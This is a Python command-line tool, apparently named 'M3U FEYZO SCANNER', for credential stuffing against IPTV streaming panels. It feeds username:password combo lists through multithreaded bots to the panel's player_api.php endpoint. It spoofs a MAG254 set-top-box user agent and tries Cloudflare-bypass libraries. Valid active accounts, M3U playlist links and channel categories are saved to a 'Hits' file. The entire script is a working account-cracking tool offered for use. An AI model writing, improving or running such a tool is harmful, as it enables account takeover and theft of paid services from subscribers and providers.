import os, sys, time, datetime, threading, subprocess, json, logging, re, unicodedata
from colorama import Fore, Style, init
from urllib.parse import urlparse

try: import socks
except ImportError:
    print("Installiere PySocks fuer SOCKS5 Unterstuetzung...")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'PySocks', '-q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import socks

IS_WIN = os.name == 'nt'

try: import requests
except ImportError:
    print("Modul requests nicht gefunden. Installiere...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

if IS_WIN: init(autoreset=True)

_gui_lines_used = 0

RED = "\033[91m"
GREEN = "\033[92m"
GOLD = "\x1b[38;5;223m"
GRAY = "\x1b[38;5;102m"
BLUE1 = "\x1b[38;5;36m"
BLUE = "\x1b[38;5;37m"
RESET = "\033[0m\x1b[0m"
PENTA = f'{RED}✶  {GRAY}' if IS_WIN else f"{RED}⛧  {GRAY}"
GWIAZDA = '✶' if IS_WIN else "⛧"
sym1 = "✶" if IS_WIN else "⊱"
sym2 = "✶" if IS_WIN else "⊰"
sym3 = "✶" if IS_WIN else "⋆"

LOGO = f"""{GRAY}
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀  
{GOLD}
   █▄▄ ▄▀█ █▀█ █░█ █▀█   
   █▄█ █▀█ █▀▀ █▀█ █▄█   
{GRAY}
  █▀▀ █▀▀ █▄█ ▀█ █▀█  
  █▀░ ██▄ ░█░ █▄ █▄█  
{GRAY}
   ░█▀▄▀█ █▀▀█ █░█░   
   ░█░▀░█ ░░▀▄ █▄█░   
   ░░░░░░░█▄▄█░░░░░   
{GOLD}
   Ғɪx-LX 2o26-04.29  {GRAY}
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  
"""

LOGO2 = f"""{GRAY}
   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀   
{GOLD}
          █▄▄ ▄▀█ █▀█ █░█ █▀█   
          █▄█ █▀█ █▀▀ █▀█ █▄█   
{GRAY}
          █▀▀ █▀▀ █▄█ ▀█ █▀█
          █▀░ ██▄ ░█░ █▄ █▄█
                  
           ░█▀▄▀█ █▀▀█ █░█░    
           ░█░▀░█ ░░▀▄ █▄█░    
           ░░░░░░░█▄▄█░░░░░    
{GOLD}
           Ғɪx-LX 2o26-04.28{GRAY}
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   
"""

_zm = {
    '1': ["░░███╗░░", "░████║░░", "██╔██║░░", "╚═╝██║░░", "███████╗", "╚══════╝"],
    '2': ["██████╗░", "╚════██╗", "░░███╔═╝", "██╔══╝░░", "██████╗╗", "╚══════╝"],
    '3': ["██████╗░", "╚════██╗", "░█████╔╝", "░╚═══██╗", "██████╔╝", "╚═════╝░"],
    '4': ["░░██╗██╗", "░██╔╝██║", "██╔╝░██║", "███████║", "╚════██║", "░░░░░╚═╝"],
    '5': ["███████╗", "██╔════╝", "██████╗░", "╚════██╗", "██████╔╝", "╚═════╝░"],
    '6': ["░█████╗░", "██╔═══╝░", "██████╗░", "██╔══██╗", "╚█████╔╝", "░╚════╝░"],
    '7': ["███████╗", "╚════██║", "░░░░██╔╝", "░░░██╔╝░", "░░██╔╝░░", "░░╚═╝░░░"],
    '8': ["░█████╗░", "██╔══██╗", "╚█████╔╝", "██╔══██╗", "╚█████╔╝", "░╚════╝░"],
    '9': ["░█████╗░", "██╔══██╗", "╚██████║", "░╚═══██╗", "░█████╔╝", "░╚════╝░"],
    '0': ["░█████╗░", "██╔══██╗", "██║░░██║", "██║░░██║", "╚█████╔╝", "░╚════╝░"]
}

def get_char_width(char):
    if unicodedata.east_asian_width(char) in ['F', 'W']: return 2
    return 1

def calculate_width(string):
    string_without_colors = re.sub(r'\x1b\[[0-9;]*m', '', string)
    return sum(get_char_width(c) for c in string_without_colors)

def g_wi():
    try: return os.get_terminal_size().columns
    except OSError: return 38

def center_line(line, width):
    line_width = calculate_width(line)
    padding = max(0, (width - line_width) // 2)
    return " " * padding + line

def _pad_block(line, width=7):
    current_len = len(line)
    if current_len < width: line += "░" * ((width - current_len))
    return line

def _rn(input_text, indent=0):
    ro = [""] * 6
    prefix = " " * indent
    for char in input_text:
        if char in _zm:
            for i in range(6): ro[i] += _pad_block(_zm[char][i], 7) + "  "
        else:
            for i in range(6): ro[i] += _pad_block("", 7) + "  "
    return "\n".join([prefix + line for line in ro])

def plo():
    wid = g_wi()
    for line in LOGO.splitlines(): print(center_line(line, wid))

def _po(PORTAL, up, hit, zusatz, zusatz2):
    global _gui_lines_used
    if not hit: hit = "0"
    if _gui_lines_used == 0:
        sys.stdout.write("\033[2J\033[H")
        sys.stdout.flush()
        wid = g_wi()
        for line in LOGO.splitlines(): sys.stdout.write(center_line(line, wid) + "\n")
        sys.stdout.flush()
    if _gui_lines_used > 0:
        sys.stdout.write(f"\033[{_gui_lines_used}A") 
        sys.stdout.write("\033[J") 
    output1 = f"""{GOLD}
─────────| Scan |─────────
{BLUE}
{str(PORTAL)[:10]}:ʜɪᴅᴅᴇɴ{GRAY}
{str(up)[:10]}:ʜɪᴅᴅᴇɴ
{GRAY}
█░█ █ ▀█▀ █▀
█▀█ █ ░█░ ▄█
{GOLD}
{_rn(str(hit), indent=1)}

{zusatz}
{zusatz2}
"""
    final_lines = []
    wid = g_wi()
    for line in output1.splitlines(): final_lines.append(center_line(line, wid))
    out_text = "\n".join(final_lines) + "\n"
    sys.stdout.write(out_text)
    sys.stdout.flush()
    _gui_lines_used = len(final_lines)

_last_print_width = 0

def _pr(output="", mode=False):
    global _last_print_width, _gui_lines_used
    _gui_lines_used = 0
    if not output: output = "0"
    wid = g_wi()
    lines = output.splitlines()
    current_max_width = 0
    for line in lines:
        w = calculate_width(line)
        if w > current_max_width: current_max_width = w
    if not mode:
        _last_print_width = current_max_width
        padding = max(0, (wid - current_max_width) // 2)
        sys.stdout.write("\033[2J")
        sys.stdout.write("\033[H") 
        sys.stdout.flush()
        plo()
        for line in lines: sys.stdout.write(" " * padding + line + "\n")
        sys.stdout.flush()
        return None
    else:
        block_width = _last_print_width if _last_print_width > 0 else current_max_width
        padding = max(0, (wid - block_width) // 2)
        if len(lines) > 1:
            for line in lines: sys.stdout.write(" " * padding + line + "\n")
            sys.stdout.flush()
            user_input = input(" " * padding)
            return user_input
        else:
            user_input = input(" " * padding + output)
            return user_input

def rwsa(text) -> str:
    normal_alphabet = "AĄÄBCĆDEĘFGHIJKLŁMNOÖÒÓPQRSŚTUÜVWXYZŻŹ" + "aąäbcćdeęfghijklłmnoöòópqrsśtuüvwxyzżź" + "1234567890"
    special_alphabet1 = "ᴀᴀᴀʙᴄᴄᴅᴇᴇꜰɢʜɪᴊᴋʟʟᴍᴎᴏᴏᴏᴏᴘǫʀssᴛᴜᴜᴠᴡxʏᴢzᴢ" + "ᴀᴀᴀʙᴄᴄᴅᴇᴇꜰɢʜɪᴊᴋʟʟᴍᴎᴏᴏᴏᴏᴘǫʀssᴛᴜᴜᴠᴡxʏᴢzz" + f"{'1234567890' if IS_WIN else '𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿𝟶'}"
    translation_table = str.maketrans(normal_alphabet, special_alphabet1)
    return str(text).translate(translation_table)

def strip_ansi(text): return re.sub(r'\x1b\[[0-9;]*m', '', text)
NORM_LOGO = strip_ansi(LOGO2)

class RequestManager:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
            "X-User-Agent": "Model: MAG254; Link: Ethernet",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
        })
        try:
            import cfscrape
            self.session = cfscrape.create_scraper(sess=self.session)
        except:
            try:
                import cloudscraper
                self.session = cloudscraper.create_scraper(sess=self.session)
            except: self.session = requests.Session()

    def get(self, url, timeout=8, retries=2):
        for attempt in range(retries):
            try:
                with self.session.get(url, timeout=timeout, verify=False, stream=True) as response:
                    response.encoding = 'utf-8'
                    return response.text
            except requests.exceptions.RequestException:
                if attempt < retries - 1: time.sleep(0.5)
                continue
        return None

class Config:
    def __init__(self):
        self.combo_dir = '/sdcard/combo/'
        self.output_dir = '/sdcard/Hits/'
        os.makedirs(self.output_dir, exist_ok=True)
        self.panel = ""
        self.combo_file = ""
        self.bot_count = 1
        self.fetch_categories = False

    def setup(self):
        comb_prt = "\n\n--- M3U FEYZO SCANNER ---\n\n"
        files = [f for f in os.listdir(self.combo_dir) if os.path.isfile(os.path.join(self.combo_dir, f))]
        if not files: _pr("Keine Combos im Ordner gefunden!"); sys.exit(1)
        for i, f in enumerate(files, 1): comb_prt += f"[{i}] {f}\n"
        _pr(comb_prt + "\n\n")
        choice = _pr(f"{GWIAZDA} : ", True)
        try: self.combo_file = os.path.join(self.combo_dir, files[int(choice) - 1])
        except (ValueError, IndexError): _pr("Ungültige Auswahl!"); sys.exit(1)
        _pr("\n\nBOTs\n\nAnzahl der Bots (1-15)\n\n")
        bots = _pr(f"{GWIAZDA} : ", True)
        self.bot_count = max(1, min(15, int(bots))) if bots.isdigit() else 1
        _pr("\n\nPanel\n\nHost (ohne http://)\n\n")
        self.panel = _pr(f"{GWIAZDA} : ", True).replace("http://", "").replace("/c", "").replace("/", "")
        _pr("\n\nKategorie\n\nAlle Kategorien? (1=Ja, 2=Nein)\n\n")
        kat = _pr(f"{GWIAZDA} : ", True)
        self.fetch_categories = (kat == "1")
        _pr(f"\n\nStarte Scan mit {self.bot_count}\nBots auf {self.panel}...")

class HitFormatter:
    def __init__(self, req_manager: RequestManager):
        self.req = req_manager

    def format_and_save(self, data, panel, fetch_kat):
        exp_date = data.get('exp_date')
        exp_str = datetime.datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d %H:%M:%S') if exp_date and exp_date != "null" else "Unlimited"
        user = data['username']
        pwd = data['password']
        m3u_link = f"http://{panel}/get.php?username={user}&password={pwd}&type=m3u_plus"
        output = f"""
--- HIT GEFUNDEN ---
Host: http://{panel}
Realm: {data.get('url', 'N/A')}
Port: {data.get('port', 'N/A')}
User: {user}
Pass: {pwd}
Ablauf: {exp_str}
Aktiv: {data.get('active_cons', 'N/A')} / Max: {data.get('max_connections', 'N/A')}
Status: {data.get('status', 'N/A')}
Zeitzone: {data.get('timezone', 'N/A')}
M3U Link: {m3u_link}

"""
        if fetch_kat:
            kat_link = f"http://{panel}/player_api.php?username={user}&password={pwd}&action=get_live_categories"
            kat_html = self.req.get(kat_link, timeout=15) 
            if kat_html:
                try:
                    kats = json.loads(kat_html)
                    if kats:
                        output += "Kategorien:\n"
                        for k in kats: output += f" - {k.get('category_name', 'Unknown')}\n"
                except json.JSONDecodeError: output += "(Fehler beim Parsen der Kategorien)\n"
            else: output += "(Timeout bei Kategorien-Abfrage)\n"
        #print(output)
        safe_panel = panel.replace(':', '_')
        out_file = os.path.join(Config().output_dir, f'Hits_{safe_panel}.txt')
        with open(out_file, 'a', encoding='utf-8') as f:
            f.write(output + "\n")

class Scanner:
    def __init__(self, config: Config, req_manager: RequestManager):
        self.config = config
        self.req = req_manager
        self.formatter = HitFormatter(req_manager)
        self.hits = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.combo_lines = []
        self.current_user_pwd = ""
        self.current_bot_id = 0
        self.current_progress = 0.0
        self.stop_gui = False

    def load_combos(self):
        with open(self.config.combo_file, 'r', encoding='utf-8', errors='ignore') as f:  self.combo_lines = f.readlines()
        _pr(f"\n\nGeladen: {len(self.combo_lines)} Combos.\n")

    def check_combo(self, user, pwd):
        link = f"http://{self.config.panel}/player_api.php?username={user}&password={pwd}"
        veri = self.req.get(link, timeout=8) 
        if not veri: return None
        try: data = json.loads(veri)
        except json.JSONDecodeError: return None
        if isinstance(data, dict) and 'user_info' in data:
            user_data = data['user_info']
            if isinstance(user_data, list) and len(user_data) > 0: user_data = user_data[0]
            if isinstance(user_data, dict) and user_data.get('status') == 'Active':
                flat_data = {
                    'username': user_data.get('username'),
                    'password': user_data.get('password'),
                    'status': user_data.get('status'),
                    'exp_date': user_data.get('exp_date'),
                    'active_cons': user_data.get('active_cons'),
                    'max_connections': user_data.get('max_connections'),
                    'timezone': data.get('server_info', {}).get('timezone'),
                    'port': data.get('server_info', {}).get('port'),
                    'url': data.get('server_info', {}).get('url')
                }
                return flat_data
        return None

    def worker(self, bot_id):
        total = len(self.combo_lines)
        for i in range(bot_id, total, self.config.bot_count):
            line = self.combo_lines[i].strip()
            if not line or ':' not in line:  continue
            user, pwd = line.split(':', 1)
            user = user.strip()
            pwd = pwd.strip()
            progress = round(((i + 1) / total) * 100, 2)
            with self.lock:
                self.current_user_pwd = f" {user}:{pwd}"
                self.current_bot_id = bot_id
                self.current_progress = progress
            result = self.check_combo(user, pwd)
            if result:
                with self.lock:
                    self.hits += 1
                    self.current_user_pwd = f"[+] HIT: {user}:{pwd}"
                    self.formatter.format_and_save(result, self.config.panel, self.config.fetch_categories)

    def draw_gui_loop(self):
        while not self.stop_gui:
            with self.lock:
                user_pwd = self.current_user_pwd
                bot_id = self.current_bot_id
                progress = self.current_progress
                hits = self.hits
                elapsed = round(time.time() - self.start_time, 2)
            _po(
                self.config.panel, 
                user_pwd,
                str(hits),
                f"[Bot {bot_id:02d}] | {progress}%",
                f"Zeit: {elapsed}s"
            )
            time.sleep(0.5)

    def start(self):
        self.load_combos()
        gui_thread = threading.Thread(target=self.draw_gui_loop, daemon=True)
        gui_thread.start()
        threads = []
        for i in range(self.config.bot_count):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            threads.append(t)
            t.start()
        for t in threads:  t.join()
        self.stop_gui = True
        time.sleep(0.6)
        _pr(f"\n\nScan abgeschlossen! Gesamtzeit: {round(time.time() - self.start_time, 2)}s\n\nGefundene Hits: {self.hits}")

if __name__ == "__main__":
    cfg = Config()
    cfg.setup()
    req_mgr = RequestManager()
    scanner = Scanner(cfg, req_mgr)
    scanner.start()